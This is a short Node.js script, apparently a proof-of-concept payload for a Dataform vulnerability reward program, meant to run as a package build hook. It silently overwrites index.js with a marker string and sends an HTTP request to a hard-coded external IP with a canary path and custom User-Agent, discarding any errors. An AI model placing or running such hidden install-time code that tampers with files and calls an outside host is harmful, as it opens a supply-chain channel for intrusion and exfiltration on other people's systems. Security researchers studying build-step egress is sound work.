'use strict';

const fs = require('fs');
const http = require('http');

fs.writeFileSync(
  'index.js',
  "'use strict';\n\nmodule.exports = 'CODEX_DATAFORM_PREPARE_EGRESS_RAN_V1';\n"
);

const request = http.get({
  hostname: '136.65.102.24',
  port: 8080,
  path: '/df-vrp-7df5ddfa9c7f49a2b7da5f2ec3215f15',
  headers: {
    'User-Agent': 'Dataform-VRP-fixed-canary-v1'
  },
  timeout: 5000
}, response => response.resume());

request.on('timeout', () => request.destroy());
request.on('error', () => {});
